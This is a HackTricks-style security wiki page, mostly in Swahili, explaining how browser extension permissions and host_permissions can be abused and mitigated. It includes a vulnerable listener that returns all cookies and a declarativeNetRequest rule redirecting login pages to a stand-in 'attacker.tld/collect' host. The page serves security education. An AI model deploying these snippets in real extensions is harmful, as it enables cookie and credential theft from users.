# BrowExt - permissions & host_permissions

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi

### **`permissions`**

Ruhusa zimetangazwa katika faili ya extension **`manifest.json`** kwa kutumia mali **`permissions`** na kuruhusu upatikanaji wa karibu chochote ambacho browser inaweza kufikia (Cookies au uhifadhi wa kimwili):

Manifest iliyotangulia inatangaza kwamba extension inahitaji ruhusa ya `storage`. Hii inamaanisha inaweza kutumia [the storage API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/storage) kuhifadhi data yake kwa kudumu. Tofauti na cookies au `localStorage` APIs ambazo zinawapa watumiaji kiwango fulani cha udhibiti, **uhifadhi wa extension kwa kawaida unaweza kufutwa tu kwa kuondoa extension**.

Extension itaomba ruhusa zilizoonyeshwa katika faili yake ya **`manifest.json`**, na baada ya kusanidi extension, unaweza **daima kukagua ruhusa zake kwenye browser yako**, kama inavyoonyeshwa katika picha hii:

<figure><img src="../../images/image (18).png" alt=""><figcaption></figcaption></figure>

Unaweza kupata [**complete list of permissions a Chromium Browser Extension can request here**](https://developer.chrome.com/docs/extensions/develop/concepts/declare-permissions#permissions) na [**complete list for Firefox extensions here**](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/permissions#api_permissions)**.**

### `host_permissions`

Mipangilio ya hiari lakini yenye nguvu **`host_permissions`** inaonyesha na hosts gani extension itaweza kuingiliana kupitia APIs kama [`cookies`](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/cookies), [`webRequest`](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/webRequest), na [`tabs`](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs).

`host_permissions` ifuatayo kimsingi huruhusu kila tovuti:
```json
"host_permissions": [
"*://*/*"
]

// Or:
"host_permissions": [
"http://*/*",
"https://*/*"
]

// Or:
"host_permissions": [
"<all_urls>"
]
```
These are the hosts that the browser extension can access freely. This is because when a browser extension calls **`fetch("https://gmail.com/")`** it's not restricted by CORS.

## Kutumia vibaya `permissions` na `host_permissions`

### Cookies

Ruhusa ya **`cookies`** inaruhusu extension kufikia **cookies zote** za browser. Katika [**this blog post**](https://theindiannetwork.medium.com/reverse-engineering-a-browser-extension-led-me-to-a-dangerous-exploit-25-000-bounty-c7dda4601753) ruhusa hii ilitumiwa vibaya kupitia **vulnerable backdound script** ili kumtumikia attacker kwa kumpa cookies zote za browser za mtumiaji mwathirika aliyefikia ukurasa wa wavuti hatari. Msimbo ulio hatarishi ulikuwa unarudisha tu cookies zote:
```javascript
chrome.runtime.onMessage.addListener(
function(request, sender, sendResponse) {
if (request.action == "getCookies") {
chrome.cookies.getAll({}, function(cookies) {
sendResponse({data: cookies});
});
}
return true;
}
);
```
### Tabs

Zaidi ya hayo, **`host_permissions`** pia huifungua “advanced” [**tabs API**](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs) **functionality.** Huiwezesha extension kuita [tabs.query()](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/query) na sio tu kupata **list ya browser tabs za mtumiaji** bali pia kujua ni **web page (kumaanisha address na title) gani imepakiwa**.

> [!CAUTION]
> Not only that, listeners like [**tabs.onUpdated**](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/onUpdated) **become way more useful as well**. These will be notified whenever a new page loads into a tab.

### Kuendesha content scripts <a href="#running-content-scripts" id="running-content-scripts"></a>

Content scripts si lazima ziandikwe kwa statiki ndani ya extension manifest. Ikiwa kupewa `host_permissions` za kutosha, extensions pia zinaweza kuzitoa kwa njia ya dynamic kwa kuita [**tabs.executeScript()**](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/executeScript) au [**scripting.executeScript()**](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/scripting/executeScript).

APIs zote mbili zina uwezo wa kutekeleza si tu faili zilizomo ndani ya extensions kama content scripts bali pia arbitrary code. API ya kwanza inaruhusu kupitisha JavaScript code kama string wakati ile ya pili inapokea JavaScript function ambayo ina uwezekano mdogo wa injection vulnerabilities. Hata hivyo, APIs zote mbili zinaweza kusababisha madhara makubwa endapo zitapitwa vibaya.

> [!CAUTION]
> Kwa ziada ya uwezo ulioelezwa hapo juu, content scripts kwa mfano zinaweza **intercept credentials** zinapoingizwa kwenye web pages. Njia nyingine ya kawaida ya kuyatumia vibaya ni **injecting advertising** kwenye tovuti zote. Kuongeza **scam messages** ili kudanganya uaminifu wa tovuti za habari pia inawezekana. Mwisho, zinaweza **manipulate banking** websites ili kuhamisha pesa kwa njia isiyotakiwa.

### Implicit privileges

Baadhi ya privileges za extension **hazihitaji kutangazwa wazi**. Mfano mmoja ni [tabs API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs): utendaji wake wa msingi unapatikana bila ruhusa yoyote kabisa. Extension yoyote inaweza kutaarifiwa unapofungua au kufunga tabs, ila haitajua ni tovuti gani tabs hizo zinahusiana nazo.

Sounds too harmless? The [tabs.create() API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/create) is somewhat less so. Inaweza kutumika **kuunda tab mpya**, karibu sawa na [window.open()](https://developer.mozilla.org/en-US/docs/Web/API/Window/open) ambayo tovuti yoyote inaweza kuiita. Hata hivyo, wakati `window.open()` iko chini ya **pop-up blocker**, `tabs.create()` haina ulinzi huo.

> [!CAUTION]
> An extension can create any number of tabs whenever it wants.

Ukitazama vigezo vya `tabs.create()`, utaona uwezo wake unaenda mbali zaidi kuliko kile `window.open()` inaruhusiwa kudhibiti. Na ingawa Firefox hairuhusu `data:` URIs kutumika na API hii, Chrome haina ulinzi kama huo. **Use of such URIs on the top level has been** [**banned due to being abused for phishing**](https://bugzilla.mozilla.org/show_bug.cgi?id=1331351)**.**

### Webcam, geolocation and friends

Labda unajua kwamba web pages zinaweza kuomba ruhusa maalum, kwa mfano ili kupata ufikiaji wa webcam (video conferencing tools) au geolocation (maps). Ni vipengele vyenye uwezo mkubwa wa kutumiwa vibaya, hivyo watumiaji kila mara wanapaswa kuthibitisha kuwa bado wanataka haya.

> [!CAUTION]
> Not so with browser extensions. **If a browser extension** [**wants access to your webcam or microphone**](https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia)**, it only needs to ask for permission once**

Kawaida, extension itafanya hivyo mara tu baada ya kusakinishwa. Mara prompt hii itakapokubaliwa, **webcam access is possible at any time**, hata kama mtumiaji hajawahi kuingiliana na extension kwa wakati huo. Ndiyo, mtumiaji atakubali prompt hii tu ikiwa extension inahitaji kweli ufikiaji wa webcam. Lakini baada ya hapo wanapaswa kumwamini extension kwamba haitarekodi chochote kwa siri.

Kwa ufikiaji wa [your exact geographical location](https://developer.mozilla.org/en-US/docs/Web/API/Geolocation) au yaliyomo kwenye [contents of your clipboard](https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API), kutoa ruhusa kwa uwazi si lazima kabisa. Extension inaongeza tu `geolocation` au `clipboard` kwenye [permissions entry](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/permissions) ya manifest yake. Haki hizi za ufikiaji kisha zinatolewa implicitly wakati extension inaposakinishwa. Hivyo extension mbaya au iliyoharibika yenye haki hizi inaweza kuunda profaili ya harakati zako au kufuatilia clipboard yako kwa nywila zilizokopiwa bila wewe kutambua kitu.

Kuongeza neno la `history` kwenye [permissions entry](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json/permissions) ya manifest ya extension kunatoa ufikiaji kwa [history API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/history). Hii inaruhusu kupata historia yote ya kuvinjari ya mtumiaji kwa pamoja, bila kusubiri mtumiaji atembelee tovuti hizo tena.

`bookmarks` permission ina uwezo sawa wa kutumiwa vibaya; hii inaruhusu kusoma bookmarks zote kupitia [bookmarks API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/bookmarks).

### Storage permission

Extension storage ni mkusanyiko tu wa key-value, sawa sana na [localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage) ambayo tovuti yoyote inaweza kutumia. Kwa hiyo hakuna taarifa nyeti inapaswa kuhifadhiwa hapa.

Hata hivyo, kampuni za matangazo pia zinaweza kutumia vibaya storage hii.

### More permissions

Manifest V3 ilitenganisha page access kutoka kwa API permissions: **`permissions`** bado inasimamia privileged APIs (cookies, tabs, history, scripting, n.k.) wakati **`host_permissions`** inadhibiti origins ambazo API hizo zinaweza kugusa. MV3 pia ilifanya host permissions ziwe runtime‑grantable, hivyo extensions zinaweza kuja bila yoyote na baadaye kuonyesha prompt ya idhini kupitia `chrome.permissions.request()`—Inafaa kwa workflows halali za least‑privilege, lakini pia imetumika vibaya na malware kuongeza hadhi baada ya sifa/utaratibu kuanzishwa.

Toleo lisiloonekana ni **`declarativeNetRequestWithHostAccess`** (Chrome ≥96). Linatoa nguvu sawa ya kufunga/kuelekeza maombi kama `declarativeNetRequest` lakini linaonyesha prompt ya usakinishaji dhaifu ukilinganisha na `<all_urls>` host permissions. Extensions hatari zinazitumia kupata kimya kimya uwezo wa “block/redirect on any site”; jaribu prompts kwa `chrome://extensions/?errors` na `chrome://extensions/?id=<id>`.

`declarativeNetRequest` dynamic rules zinaweza kumruhusu extension ku-reprogram sera ya mtandao wakati wa runtime. Kwa `<all_urls>` host access mshambuliaji anaweza kuitegemeza kama silaha ku-hijack traffic au data exfil. Mfano:
```javascript
chrome.declarativeNetRequest.updateDynamicRules({
addRules: [{
id: 9001,
priority: 1,
action: {
type: "redirect",
redirect: { url: "https://attacker.tld/collect" }
},
condition: { urlFilter: "|http*://*/login", resourceTypes: ["main_frame"] }
}]
});
```
Chrome iliongeza mipaka ya sheria za MV3 (≈330k static / 30k dynamic), hivyo seti kubwa za coverage zinawezekana kwa interception/ads injection.

### Mifumo ya matumizi mabaya ya hivi karibuni

* **Supply-chain trojanized updates:** Akaunti za developer zilizotorwa hutuma updates za MV3 zinazoongeza `<all_urls>` pamoja na `declarativeNetRequest`/`scripting`/`webRequest` ili kuingiza remote JS na kunyakua headers/maudhui ya DOM.
* **Wallet drains:** Ufikiaji wa host pamoja na `storage` na `tabs` huruhusu extensions za wallet zilizo backdoor ku-exfiltrate seeds; stolen Web Store API keys zimetumika kusafirisha malicious builds.
* **Cookie theft:** Kila extension yenye `cookies` + ufikiaji mpana wa host inaweza kusoma auth cookies licha ya `HttpOnly`—tathmini mchanganyiko huo kama uwezo wa credential-stealing.

## Kuzuia <a href="#why-not-restrict-extension-privileges" id="why-not-restrict-extension-privileges"></a>

Sera ya Google's developer inaeleza wazi kwamba extensions haziruhusiwi kuomba vibali zaidi ya vinavyohitajika kwa utendaji wao, hivyo kupunguza kwa ufanisi maombi ya vibali kupindukia. Mfano ambapo extension ya browser ilivuka kikomo hiki ilikuwa kusambazwa pamoja na browser yenyewe badala ya kupitia duka la add-on.

Browsers zinaweza pia kupunguza matumizi mabaya ya vibali vya extension. Kwa mfano, Chrome's [tabCapture](https://developer.chrome.com/docs/extensions/reference/tabCapture/) na [desktopCapture](https://developer.chrome.com/docs/extensions/reference/desktopCapture/) APIs, zinazotumika kwa kurekodi skrini, zimetengenezwa kupunguza matumizi mabaya. tabCapture API inaweza tu kuanzishwa kupitia uingiliano wa moja kwa moja wa mtumiaji, kama kubofya ikoni ya extension, wakati desktopCapture inahitaji uthibitisho wa mtumiaji kwa dirisha kurekodiwa, kuzuia shughuli za kurekodi kwa siri.

Hata hivyo, kuimarisha hatua za usalama mara nyingi kunasababisha kupunguza unyumbufu na urahisi wa matumizi wa extensions. `activeTab permission` inaonyesha kutoa na kupokea hili. Iliwekwa kuondoa haja ya extensions kuomba host privileges kwa intaneti nzima, kuruhusu extensions kufikia tab iliyopo tu baada ya mtumiaji kuiteua wazi. Mfano huu unafanya kazi kwa extensions zinazotegemea vitendo vinavyosababishwa na mtumiaji lakini hautoshi kwa zile zinazohitaji vitendo vya moja kwa moja au vya kuzuia kabla, hivyo kupunguza urahisi na mwitikio wa papo hapo.

## **References**

- [https://palant.info/2022/08/17/impact-of-extension-privileges/](https://palant.info/2022/08/17/impact-of-extension-privileges/)
- [https://www.cobalt.io/blog/introduction-to-chrome-browser-extension-security-testing](https://www.cobalt.io/blog/introduction-to-chrome-browser-extension-security-testing)
- [https://gitlab-com.gitlab.io/gl-security/security-tech-notes/threat-intelligence-tech-notes/malicious-browser-extensions-feb-2025/](https://gitlab-com.gitlab.io/gl-security/security-tech-notes/threat-intelligence-tech-notes/malicious-browser-extensions-feb-2025/)
- [https://developer.chrome.com/blog/resuming-the-transition-to-mv3/](https://developer.chrome.com/blog/resuming-the-transition-to-mv3/)

{{#include ../../banners/hacktricks-training.md}}
